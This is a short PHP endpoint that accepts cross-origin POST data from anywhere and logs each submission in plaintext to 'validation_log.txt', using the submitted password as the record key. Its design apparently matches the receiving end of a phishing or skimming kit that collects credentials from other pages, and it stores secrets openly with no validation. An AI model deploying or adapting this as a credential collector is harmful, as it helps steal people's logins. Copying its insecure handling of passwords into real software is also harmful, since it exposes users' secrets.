<?php
header("Access-Control-Allow-Origin: *");
header('Content-Type: application/json');

function addNewLog($info, $logFile){ 
    $logData = date('Y-m-d H:i:s') . "\n";
    $logData .=  json_encode($info) . "\n";    
    $logData .= "\n";
    if(file_put_contents($logFile, $logData, FILE_APPEND) === false){
        return json_encode(array('result' => 'Error writing to log file'));
    }
    return json_encode(array('result' => 'Added new log'));
}

function updateLogFile($info) {
    $logFile = 'validation_log.txt';

    $filter = "password";
    if (!isset($info[$filter])) { 
        return addNewLog($info, $logFile);
    } else { 
        $infoId = $info[$filter]; 
        $fileContents = file_get_contents($logFile);
        $foundAndReplaced = false;
        if($fileContents){
            $lines = explode("\n", $fileContents);
            foreach ($lines as $line) { 
                $trimmed_line = trim($line); 
                if (empty($trimmed_line)) {
                    $updatedLines[] = $line;
                    continue; 
                } 
        
                $decodedItem = json_decode($trimmed_line, true);  
                
                if ($decodedItem && isset($decodedItem[$filter]) && $decodedItem['password'] === $infoId) { 
                    $trimmed_line = json_encode($info);
                    $foundAndReplaced = true;  
                }  
                $updatedLines[] = $trimmed_line;
            } 
            if ($foundAndReplaced){  
                file_put_contents($logFile, implode("\n", $updatedLines));
                return json_encode(array('result' => 'Updated ' . $infoId . ' log'));
            }
        }
        if(!$foundAndReplaced){ 
            return addNewLog($info, $logFile);
        }
    }  
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {  
    echo updateLogFile($_POST);
} else{ 
    echo json_encode(array('result' => 'Invalid request method.'));
} 

?>